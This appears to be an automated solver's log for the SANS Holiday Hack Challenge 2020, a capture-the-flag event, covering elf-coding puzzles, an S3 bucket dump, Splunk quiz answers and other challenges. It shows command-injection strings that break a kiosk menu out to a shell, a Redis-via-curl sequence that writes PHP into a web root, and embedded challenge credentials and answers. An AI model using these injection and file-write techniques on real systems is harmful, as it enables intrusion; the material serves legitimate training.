                    <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP -->
                    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
                    <meta http-equiv="X-Content-Security-Policy" content="default-src 'self'; script-src 'self'">
                    <link rel="stylesheet" href="style.css">

                    <title>Santa PoS</title>
                    </head>
                    <body>
                    <h1>Santa PoS</h1>

                    <div id="header">
                        <p id="header-left">SantaPOS v1.0</p>
                        <p id="header-right">User: elf </p>
                    </div>

                    <div id="network-container">
                        <img alt="network" id="network" src="img/network1.png" />
                    </div>

                    <div id="cart">
                    </div>

                    <div id="totals">
                        <div id="totals-inside">
                        <div id="subtotal">$0.00</div>
                        <div id="tax">$0.00 @ 0%</div>
                        <div id="total">$0.00</div>

                        <div id="buttons">
                            <button id="voidTransaction" class="red-button">Void</button>
                            <button id="checkout" class="green-button">Checkout</button>
                        </div>
                        </div>
                    </div>

                    <div id="products"></div>

                    <div id="overlay"></div>
                    <div id="overlay-content-outer"></div>
                    <div id="overlay-content-inner"></div>

                    <script src="./renderer.js"></script>
                    </body>
                </html>
                // Modules to control application life and create native browser window
                const { app, BrowserWindow, ipcMain } = require('electron');
                const path = require('path');

                const SANTA_PASSWORD = 'santapass';

            
2020-12-31 18:17:19.807 +00:00 [VRB] Challenge PointOfSalePasswordRecovery completed
2020-12-31 18:17:19.809 +00:00 [VRB] Running challange TheElfCode
2020-12-31 18:17:19.831 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-1.js
elf.moveTo(lollipop[0]);
elf.moveUp(10);


2020-12-31 18:17:19.861 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-2.js
elf.moveLeft(6);
elf.pull_lever(elf.get_lever(0) + 2);
elf.moveLeft(4);
elf.moveUp(10);

2020-12-31 18:17:19.888 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-3.js
for (i = 0; i < 3; i++)
    elf.moveTo(lollipop[i])
elf.moveUp(1)


2020-12-31 18:17:19.916 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-4.js
for (i = 0; i < 3; i++) {
    elf.moveLeft(3);
    elf.moveUp(11);
    elf.moveLeft(3);
    elf.moveDown(11);
}

2020-12-31 18:17:19.961 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-5.js
let request = elf.ask_munch(0)
var response = []
request.forEach((value) => {
    if (typeof (value) == "number") response.push(value);
});
elf.moveTo(munchkin[0]);
elf.tell_munch(response);
elf.moveUp(2);

2020-12-31 18:17:19.997 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-6.js
for (i = 0; i <= 3; i++)
    elf.moveTo(lollipop[i])
elf.moveLeft(2);
elf.moveUp(5);
elf.pull_lever(["munchkins rule"].concat(elf.get_lever(0)));
elf.moveTo(munchkin[0])
elf.moveUp(3)








2020-12-31 18:17:20.028 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-7.js
function hello(arrays) {
    var sum = 0;
    arrays.forEach((array) => array.forEach((value) => sum += typeof (value) == "number" ? value : 0));
    return sum;
  }
  function moveAndPull(direction, j) {
    if (direction == 1)
      elf.moveDown(direction + j);
    if (direction == 2)
      elf.moveLeft(direction + j);
    if (direction == 3)
      elf.moveUp(direction + j);
    if (direction == 4)
      elf.moveRight(direction + j);
    elf.pull_lever(direction - 1 + j);
  }  
  for (i = 0; i < 2; i++)
    for (j = 1; j <= 4; j++)
      moveAndPull(j, i * 4);
  elf.moveUp(2);
  elf.moveLeft(4);
  elf.tell_munch(hello);
  elf.moveUp(1);


2020-12-31 18:17:20.087 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-8.js
function hello(objects) {
    console.log(objects);
    objects.forEach((o) => {
        for (key in o) {
            console.log(`${key}: ${o[key]}`);
            if (o[key] == "lollipop")
                result = key;
        }
    });

    console.log(result);
    return result;
}

let sum = 0
for (i = 0; i < 6; i++) {
    if ((i % 2) == 0)
        elf.moveRight(i * 2 + 1);
    else
        elf.moveLeft(i * 2 + 1);

    elf.pull_lever((sum += elf.get_lever(i)))
    elf.moveUp(3);
}
elf.ask_munch(0);
elf.tell_munch(hello);
elf.moveRight(11);

2020-12-31 18:17:20.110 +00:00 [VRB] Challenge TheElfCode completed
2020-12-31 18:17:20.144 +00:00 [VRB] Running challange InvestigateS3Bucket
2020-12-31 18:17:20.480 +00:00 [INF] <?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>wrapper3000</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>package</Key><LastModified>2020-12-04T11:43:39.000Z</LastModified><ETag>&quot;14bfb2b3daf66375c088e462ac69fbd9&quot;</ETag><Size>829</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
2020-12-31 18:17:20.733 +00:00 [INF] UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA

2020-12-31 18:17:20.735 +00:00 [VRB] Challenge InvestigateS3Bucket completed
2020-12-31 18:17:20.738 +00:00 [VRB] Running challange KringleKiosk
2020-12-31 18:17:20.740 +00:00 [INF] Go to option 4 and enter ; ls

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;ls    
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                welcome.sh


            
2020-12-31 18:17:20.779 +00:00 [INF] Go to option 4 and enter ;cat welcome.sh


                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;cat welcome.sh
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                #!/bin/bash

                declare -x LAST_ORDER
                LAST_ORDER=''

                # https://bash.cyberciti.biz/guide/Menu_driven_scripts
                # A menu driven shell script sample template
                ## ----------------------------------
                # Step #1: Define variables
                # ----------------------------------
                RED='\033[0;41;30m'
                STD='\033[0;0;39m'

                # ----------------------------------
                # Step #2: User defined function
                # ----------------------------------
                pause() {
                  read -r -p "Press[Enter] key to continue..." fackEnterKey
                }

                        one()
                        {
                            cat / opt / castlemap.txt
                          pause
                        }

                        two()
                        {
                            more / opt / coc.md
                          pause
                        }


                        three()
                        {
                            cat / opt / directory.txt
                          pause
                        }

                        four()
                        {
                            read - r - p "Enter your name (Please avoid special characters, they cause some weird errors)..." name
                          if [-z "$name"]; then
                  name = "Santa\'s Little Helper"
                          fi
                          bash - c "/usr/games/cowsay -f /opt/reindeer.cow $name"
                          pause
                        }

                        surprise()
                        {
                            cat / opt / plant.txt
                          echo "Sleeping for 10 seconds.." && sleep 10
                        }

                # function to display menus
                        show_menus()
                        {
                            clear
                            echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
                          echo " Welcome to the North Pole!"
                          echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
                          echo "1. Map"
                          echo "2. Code of Conduct and Terms of Use"
                          echo "3. Directory"
                          echo "4. Print Name Badge"
                          echo "5. Exit"
                          echo
                  echo
                          echo "Please select an item from the menu by entering a single number."
                          echo "Anything else might have ... unintended consequences."
                          echo
                        }

                # read input from the keyboard and take a action
                        read_options()
                        {
                            local choice
                          read - r - p "Enter choice [1 - 5] " choice
                          case $choice in
                  1 *) one; ;
                            2 *) two; ;
                            3 *) three; ;
                            4 *) four $choice; ;
                            5) exit 0; ;
                            plant) surprise c; ;
                            *) echo - e "${RED}Error...${STD}" && sleep 2; ;
                            esac
                        }

                # ----------------------------------------------
                # Step #3: Trap CTRL+C, CTRL+Z and quit singles
                # ----------------------------------------------
                        trap '' SIGINT SIGQUIT SIGTSTP

                # -----------------------------------
                # Step #4: Show opening message once
                # ------------------------------------
                echo
                echo Welcome to our castle, we\'re so glad to have you with us!
                echo Come and browse the kiosk\; though our app\'s a bit suspicious.
                echo Poke around, try running bash, please try to come discover,
                echo Need our devs who made our app pull/patch to help recover?
                echo
                echo "Escape the menu by launching /bin/bash"
                echo
                echo
                read -n 1 -r -s -p $'Press enter to continue...'
                clear

                # -----------------------------------
                # Step #5: Main logic - infinite loop
                # ------------------------------------

                while true; do
                  show_menus
                  read_options
                done



            
2020-12-31 18:17:20.985 +00:00 [INF] Go to option 4 and enter ;bash

                
                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.
                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;bash
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                   ___                                                      _    
                  / __|   _  _     __      __      ___     ___     ___     | |   
                  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
                  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
                _|""""" | _ | """""|_|""""" | _ | """""|_|""""" | _ | """""|_|""""" | _ | """ | 
                "`-0-0-'"`-0 - 0 - '"`-0-0-'"`-0-0-'"`-0 - 0 - '"`-0-0-'"`-0-0-'"`-0 - 0 - ' 
                Type 'exit' to return to the menu.
                shinny@9edb28c788e6: ~$ 

            
2020-12-31 18:17:21.045 +00:00 [INF] Wonder around... and wonder what that is ...

                Type 'exit' to return to the menu.

                shinny@9edb28c788e6:~$ ls
                welcome.sh
                shinny@9edb28c788e6:~$ cd ..
                shinny@9edb28c788e6:/home$ ls
                elf  shinny
                shinny@9edb28c788e6:/home$ whoami
                shinny
                shinny@9edb28c788e6:/home$ cd elf
                shinny@9edb28c788e6:/home/elf$ ls
                runtoanswer
                shinny@9edb28c788e6:/home/elf$ ./runtoanswer 

                Sorry, that answer is incorrect. Please try again!
            
2020-12-31 18:17:21.089 +00:00 [INF] Menu
Menu

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 
            
2020-12-31 18:17:21.111 +00:00 [INF] Code of Conduct and Terms of Use 


                    # KringleCon III and Holiday Hack Challenge Code of Conduct

                    1. Use the challenges here to have fun, explore, engage, and develop your cyber security skills!

                    2. Be kind! Feel free to encourage and help other players! Let Santa's elves (support@holidayhackc
                    hallenge.com) know if something seems off. Please be mindful that there are children playing. Sant
                    a is watching!

                    3. Please don't post full answers publicly until the official contest ends on Monday, January 4, 2
                    021.

                    4. SANS Holiday Hack strives to create an atmosphere of learning, growth, and community. We value 
                    the participation and input, in this event and in the industry, of people of all genders, sexual i
                    dentities, cultures, socioeconomic backgrounds, races, ethnicities, nationalities, religions, and 
                    ages. Please support this atmosphere with respectful behavior and speech. This applies to all onli
                    ne interactions associated with KringleCon and the Holiday Hack Challenge, including game chat and
                     discussions.


                    # KringleCon III and Holiday Hack Challenge Terms of Use

                    1. This service includes a "group chat" component. We cannot make any guarantees about the accurac
                    y, quality, or age - appropriateness of chat messages.

                    2.All activity and interactions within Holiday Hack Challenge are monitored and recorded.We use
                    this information to maintain an environment that is both safe and conducive to learning.

                    3.Players should avoid engaging in techniques on any Holiday Hack Challenge server that may negat
                    ively affect the server's operational status and/or availability.

                    4.Players must not attack Holiday Hack Challenge servers(*.holidayhackchallenge.com, *.kringleco
                    n.com, etc.) unless otherwise directed.If you have any questions about target scope, please email
                    : support@holidayhackchallenge.com.

                    5.E - mail addresses collected will be used in accordance with the SANS Privacy Policy(https://www
                    .sans.org / privacy /).
                
2020-12-31 18:17:21.222 +00:00 [INF] Directory


                        Name: Floor: Room:
                        Ribb Bonbowford       1        Dining Room
                        Noel Boetie           1        Wrapping Room
                        Ginger Breddie        1        Castle Entry
                        Minty Candycane       1.5      Workshop
                        Angel Candysalt       1        Great Room
                        Tangle Coalbox        1        Speaker UNPreparedness
                        Bushy Evergreen       2        Talks Lobby
                        Holly Evergreen       1        Kitchen
                        Bubble Lightington    1        Courtyard
                        Jewel Loggins Front Lawn
                        Sugarplum Mary        1        Courtyard
                        Pepper Minstix Front Lawn
                        Bow Ninecandle        2        Talks Lobby
                        Morcel Nougat         2        Speaker UNPreparedness
                        Wunorse Openslae      R NetWars Room
                        Sparkle Redberry      1        Castle Entry
                        Jingle Ringford                NJTP
                        Piney Sappington      1        Castle Entry
                        Chimney Scissorsticks 2        Talks Lobby
                        Fitzy Shortstack      1        Kitchen
                        Alabaster Snowball R        NetWars Room
                        Eve Snowshoes         3        Santa's Balcony
                        Shinny Upatree                 Front Lawn
                        Tinsel Upatree        3        Santa's Office
                
2020-12-31 18:17:21.309 +00:00 [INF] Print Name Badge

                Enter your name (Please avoid special characters, they cause some weird errors)...Jandini
                 _________
                < Jandini >
                 ---------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
            
2020-12-31 18:17:21.317 +00:00 [INF] Plant

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] plant
                  Hi, my name is Jason the Plant!

                  ( U
                   \| )
                  __|/
                  \    /
                   \__/ ejm96
                Sleeping for 10 seconds..
            
2020-12-31 18:17:21.377 +00:00 [INF] Map


                 __       _    --------------                                                
                |__)_  _ (_   | NetWars Room |                                               
                | \(_)(_)|    |              |                                               
                              |            * |                                               
                               --------------                                                
                                                                             
                __  __                              __  __                                   
                 _)|_                                _)|_          -------                   
                /__|        Tracks                  __)|          |Balcony|                  
                            1 2 3 4 5 6 7                          -------                   
                 -------    -------------                             |                      
                |Speaker|--| Talks Lobby |                        --------                   
                |Unprep |  |             |                       |Santa's |                  
                 -------    ------       |                       |Office  |                  
                                  |      |                        --    --                   
                                  |     *|                          |  |                     
                                   ------                           |   ---                  
                                                                    |    * |                 
                    __                                               ------                  
                 /||_                                                                        
                  ||                                          __ __           --------       
                  --------------------------              /| |_ |_           |Wrapping|      
                 |        Courtyard         |              |.__)|            |  Room  |      
                  --------------------------                                  --------       
                    |                    |                                       |           
                 ------    --------    ------                          ---    --------       
                |Dining|--|Kitchen |--|Great |                            |--|Workshop|      
                |      |   --------   |      |                            |  |        |      
                | Room |--|      * |--| Room |                            |  |        |      
                |      |  |Entryway|  |      |                            |  |        |      
                 ------    --------    ------                             |  |        |      
                               |                                             | *      |      
                           ----------                                         --------       
                          |Front Lawn|       NOTE: * denotes Santavator                      
                           ----------                                                        
            
2020-12-31 18:17:21.511 +00:00 [VRB] Challenge KringleKiosk completed
2020-12-31 18:17:21.544 +00:00 [VRB] Running challange UnescapeTmux
2020-12-31 18:17:21.546 +00:00 [INF] Run tmux attach 

                ..............................'.''''''.'''''''''''''
                .........................................'''''''''''
                ................................,:lccc:;,'...'''''''
                .............................';loodxkkxxdlc;'..'''''
                ............................,:ccllcldx0dxxdoc..'''''
                ...........................;ccclooodkOkok0OOx:..''''
                .........................':cccllodxxkkkOkxdxx;....''
                ........................,cccllooddxkOOOkOxoo'.....''
                ......................';:cclllccllodO0Okkkx;...'''..
                .....................:llollclclccccclokc::'.........
                ...................;ddollllllllcccccccl;............
                ..................:xdooddoooolclllllolld;...........
                .................'xxoodxxxdoooooooxkdooox'..........
                .................,xxkxdxkkxxdddddddxkkxdxl....'.....
                .................'xOkooddxkkxxdddxxkkxxxxx'.......'.
                ..................oOkddxkkkkdxxdddxxxxxxdd:......'.'
                .................';k0xxkxxOxdddddoodxdxkkx:....'''''
                ................'',o0xdddxkxdxdodddddkkkxxc....'''''
                ................',,:OK0kkOOxddddxxxddxxkxd:'''''''''
                .............',;:cccdKXKOkkOOxkxdxxxxxxkOx;'''''''''
                ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,''''''''
                .......''':c:,..'coodOO00OOOO00kxOkK0KkO0d,,''''''''
                ...;cllc::clddooddOkxoccccccloddxxO0KK0KKOc:;,''''''
                'ldolcc:::lldxkOxkO000OOOOkkxxdddxoooooooooodxxxddol
                xxlcc:::::xolldddxOOdddxxxkkOOO0000000xkOkkxddoooooo
                lo:::cccc::ldoodooxd,;lxxkkO0OOOOOOOOOOOOOO000000000
                locclccccccccldkxdkk:,;cdxkOKXXXKKKKKXXKk::::cllodxk
                xxollllcccllcodkOkO0:,,,:dkOOKKXXXKKKXXKl,,'''''''''
                xxkolllllllllodkO0KO;,,,;;lxO00KKXKKKKK0c;,,,,,,,,,,
                ,dxxxdoooollodxk0KOolc:::::cdO00KK00K000c;,,,,,,,,,;
                ..:xkOOkdoxxkOO0OxoooooolooodxOO00Ok0kk0oc:;;;;;;;;;
                ....:dkOddOO0OkdoolllllloooddxOOOOOkkkkOdllccccccccc

                You found her! Thank you!!!
            
2020-12-31 18:17:21.623 +00:00 [VRB] Challenge UnescapeTmux completed
2020-12-31 18:17:21.646 +00:00 [VRB] Running challange Splunk
2020-12-31 18:17:21.654 +00:00 [INF] Splunk url taken from java script page... before becomming Santa
https://splunk.kringlecastle.com/en-US/account/insecurelogin?username=santa&password=2f3a4fccca6406e35bcf33e92dd93135
2020-12-31 18:17:21.662 +00:00 [INF] Learning random searches

                | tstats count where index=* by index
                | metadata index=attack type=hosts

                index=attack

                index=attack | fields Technique | uniq

                index= * | mitremap

                | tstats values(sourcetypes) where index=*

                index=* sourcetype=wineventlog

                | metadata type=sourcetypes index=*

            
2020-12-31 18:17:21.711 +00:00 [INF] | metadata type=sourcetypes index=*

	                firstTime	lastTime	recentTime	sourcetype	totalCount	type
                1	1606762640	1606770257	1606770258	WinEventLog	10283	sourcetypes
                2	1606762873	1606769955	1606770075	wineventlog	220669	sourcetypes
                3	1606762638	1606770232	1606770234	xmlwineventlog	42499	sourcetypes
                4	1606758856	1606770255	1606770259	bro:conn:json	13921	sourcetypes
                5	1606762029	1606769631	1606769631	bro:dns:json	44	sourcetypes
                6	1606761928	1606770250	1606770252	bro:files:json	5812	sourcetypes
                7	1606762801	1606770250	1606770252	bro:http:json	2597	sourcetypes
                8	1606761921	1606770230	1606770236	bro:rdp:json	2363	sourcetypes
                9	1606763121	1606769601	1606769602	bro:smb_files:json	2	sourcetypes
                10	1606763121	1606769635	1606769635	bro:smb_mapping:json	8	sourcetypes
                11	1606769219	1606769219	1606769479	bro:software:json	1	sourcetypes
                12	1606761926	1606770230	1606770230	bro:ssl:json	2725	sourcetypes
                13	1606761927	1606770230	1606770230	bro:x509:json	2722	sourcetypes
                14	1606754786	1606769951	1606770027	csv	68	sourcetypes

            
2020-12-31 18:17:21.756 +00:00 [INF] | tstats count where index=* by index

	                index	count
                1	attack	68
                2	t1033-main	3311
                3	t1033-win	21734
                4	t1057-win	18006
                5	t1059.003-main	1984
                6	t1059.003-win	18519
                7	t1059.005-main	1758
                8	t1059.005-win	18852
                9	t1071.001-main	2795
                10	t1071.001-win	20718
                11	t1082-win	18136
                12	t1105-main	1938
                13	t1105-win	15424
                14	t1106-main	1611
                15	t1106-win	18720
                16	t1123-main	4281
                17	t1123-win	20488
                18	t1204.002-main	1342
                19	t1204.002-win	20033
                20	t1547.001-main	1833
                21	t1547.001-win	19490
                22	t1548.002-main	7018
                23	t1548.002-win	21499
                24	t1559.002-main	2324
                25	t1559.002-win	22144
                26	t1566.001-win	19688
            
2020-12-31 18:17:21.788 +00:00 [INF] Q1: How many distinct MITRE ATT & CK techniques did Alice emulate? 13
                
                Manual: 
                Count distinct from index list: t1033,t1057,t1059,t1071,t1082,t1105,t1106,t1123,t1204,t1547,t1548,t1559,t1566


                Hint from chat: 
                The search I used was:

                | tstats count where index=* by index 
                | search index=T*-win OR T*-main
                | rex field=index "(?< technique > t\d +)[\.\-].0 * " 
                | stats dc(technique)


            
2020-12-31 18:17:21.796 +00:00 [INF] Q2: What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003 ? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win

                t1059.003-main t1059.003-win
            
2020-12-31 18:17:21.824 +00:00 [INF] Q3: One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography

                index=* "system information discovery"

                Goggle "system information discovery mirte"

                https://attack.mitre.org/techniques/T1082/
                https://atomicredteam.io/
                https://github.com/redcanaryco/atomic-red-team/tree/master/atomics 

                From: 

                https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md

                Atomic Test #8 - Windows MachineGUID Discovery
                Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.

                Supported Platforms: Windows

                Attack Commands: Run with command_prompt!
                REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid

            
2020-12-31 18:17:21.832 +00:00 [INF] Q4: According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) 2020-11-30T17:44:15Z

                index=* OSTAP | sort +_time

                "2020-11-30T17:44:15Z","2020-11-30T17:44:15","T1105","11","OSTAP Worming Activity","win-dc-748","attackrange\administrator","2ca61766-b456-4fcf-a35a-1233685e1cad"

              
            
2020-12-31 18:17:21.858 +00:00 [INF] Q5: One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? 3648

                index=* EventCode=1
                index=* ProcessID=*

                index=* ProcessID=* | stats dc(ProcessID) by ProcessID

                index=* ProcessId=* | stats dc(ProcessId) by ProcessId
                index=* ProcessId=* EventCode=1 "Microsoft-Windows-Sysmon" | stats dc(ProcessId) by ProcessId

                index=T* ProcessId=* EventCode=1 "Microsoft-Windows-Sysmon" | stats list(ProcessId) by ProcessId

                100
                1016
                1020
                1040
                1048
                1076
                1080
                1084
                1092
                1096
                1124
                ...
                2256
                2264
                2268
                2272
                2284
                2296
                2300
                ... 700ish hits... too many

                https://github.com/frgnca/AudioDeviceCmdlets
                https://github.com/redcanaryco/atomic-red-team/search?q=AudioDeviceCmdlets

                https://github.com/redcanaryco/atomic-red-team/blob/8eb52117b748d378325f7719554a896e37bccec7/atomics/T1123/T1123.md

                index=T1123* ProcessId=* "Microsoft-Windows-Sysmon" EventCode=1


                index=T1123* ProcessId=* "Microsoft-Windows-Sysmon" EventCode=1 powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet | sort +UtcTime

            
2020-12-31 18:17:21.926 +00:00 [INF] Q6: Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? quser

                Find Atomic Test related to registry run keys...
                https://github.com/redcanaryco/atomic-red-team/search?q=registry+run+keys                
                https://github.com/redcanaryco/atomic-red-team/tree/5ff80f6f90c056b0bfe3a6ffa0f5015f215c56b0/atomics/T1547.001                
                https://github.com/redcanaryco/atomic-red-team/blob/5ff80f6f90c056b0bfe3a6ffa0f5015f215c56b0/atomics/T1547.001/T1547.001.md#atomic-test-6---suspicious-bat-file-run-from-startup-folder

                index=* batstartup.bat
                
                it was not this one... so went to find all bat files in atomice-red-team...
                https://github.com/redcanaryco/atomic-red-team/blob/8eb52117b748d378325f7719554a896e37bccec7/atomics/T1074.001/src/Discovery.bat
                
            
2020-12-31 18:17:21.933 +00:00 [INF] Q7: According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? 55FCEEBB21270D9249E86F4B9DC7AA60


                | tstats count where index=* groupby sourcetype _time

	                sourcetype	_time	count
                1	WinEventLog	2020-11-30	10283
                2	WinEventLog:Microsoft-Windows-PowerShell/Operational	2020-11-30	220669
                3	XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	    2020-11-30	42499
                4	bro:conn:json	2020-11-30	13921
                5	bro:dns:json	2020-11-30	44
                6	bro:files:json	2020-11-30	5812
                7	bro:http:json	2020-11-30	2597
                8	bro:rdp:json	2020-11-30	2363
                9	bro:smb_files:json	2020-11-30	2
                10	bro:smb_mapping:json	2020-11-30	8
                11	bro:software:json	2020-11-30	1
                12	bro:ssl:json	2020-11-30	2725
                13	bro:x509:json	2020-11-30	2722
                14	csv	2020-11-30	68

                
                There's 2722 events for bro:x509:json

                index=* sourcetype=bro:x509*

                index=* sourcetype=bro:x509* win-dc | stats dc(certificate.serial) by certificate.serial

            
2020-12-31 18:17:21.965 +00:00 [INF] 

                This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is:
                7FXjP1lyfKbyDK/MChyf36h7
                It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one!
                Santa (me)
                My favorite phrase?
                Alice Bluebird
                I can't believe the Splunk folks put it in their talk!

                Stay Frosty from https://www.youtube.com/watch?v=RxVgEFt08kU&t=511s
                RC4 from https://www.bing.com/search?q=RFC+7465&cvid=772218431bea44e08ecb8e6729a731e6&FORM=ANAB01&PC=U531

                https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4(%7B'option':'UTF8','string':'Stay%20Frosty'%7D,'Latin1','Latin1')&input=N0ZYalAxbHlmS2J5REsvTUNoeWYzNmg3

            
2020-12-31 18:17:22.003 +00:00 [VRB] Challenge Splunk completed
2020-12-31 18:17:22.027 +00:00 [VRB] Running challange DialUp336Kbps
2020-12-31 18:17:22.032 +00:00 [INF] Fitzy Shortstack

                We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken!
                Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence.
                Maybe you can help me out? The phone number is 756-8347; you can use this blue phone.

                ...

                "Put it in the cloud," they said...

            
2020-12-31 18:17:22.059 +00:00 [INF] Run from console to call
["pickup","dtmf7","dtmf5","dtmf6","dtmf8","dtmf3","dtmf4","dtmf7", "respCrEsCl","ack","cm_cj","l1_l2_info","trn"].forEach((step)=> document.getElementsByClassName(step)[0].click());
2020-12-31 18:17:22.066 +00:00 [VRB] Challenge DialUp336Kbps completed
2020-12-31 18:17:22.093 +00:00 [VRB] Running challange RedisBugHunt
2020-12-31 18:17:22.098 +00:00 [INF] Run following commands: 
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/some.php --output -



                We need your help!!

                The server stopped working, all that's left is the maintenance port.

                To access it, run:

                curl http://localhost/maintenance.php

                We're pretty sure the bug is in the index page. Can you somehow use the
                maintenance page to view the source code for the index page?
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'

                OK
